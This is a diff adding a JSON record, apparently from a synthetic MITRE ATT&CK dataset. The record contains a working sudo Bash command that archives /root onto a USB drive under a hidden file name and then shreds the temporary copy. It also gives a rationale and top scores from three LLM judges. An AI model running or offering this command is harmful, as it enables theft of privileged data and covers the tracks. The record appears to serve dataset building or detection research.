@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(ls -1 /dev/disk/by-id/usb-*-part1 2>/dev/null | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && tar -cf - /root 2>/dev/null | gzip -9 > /tmp/.r.gz && cp /tmp/.r.gz /mnt/usb/.thumb && shred -u /tmp/.r.gz && sync && umount /mnt/usb'",
+  "explanation": "Compresses sensitive /root contents with gzip into a temp file, copies it to a USB under an innocuous name, securely deletes the temp, and unmounts, keeping activity local.",
+  "rationale_steps": [
+    "Mount the USB via a stable by-id path.",
+    "Create a gzip-compressed tar of local root data.",
+    "Copy the archive onto the USB using cp.",
+    "Securely remove traces from the host and unmount.",
+    "Operate entirely on local, removable media."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-9e74f95a",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, correct use of && and pipes, valid redirections and flags, and proper variable expansion inside bash -c.",
+        "semantic_score": 5,
+        "semantic_justification": "It mounts a USB partition, compresses /root to a temp file, copies it to a hidden file on the USB, securely deletes the temp, syncs, and unmounts\u2014fully aligning with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:48:19.523634Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1052 by identifying a USB device, mounting it, compressing sensitive root directory data, copying it to the USB with a hidden filename, securely removing the temporary file, and unmounting the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:48:21.999619Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using balanced quotes, valid command separators (&&, |), correct flag formats, and proper command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves its claimed intent by identifying a USB, mounting it, compressing `/root` content, copying it to the USB under a hidden name, securely deleting the temporary file, and unmounting, directly embodying the T1052 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:48:37.614482Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
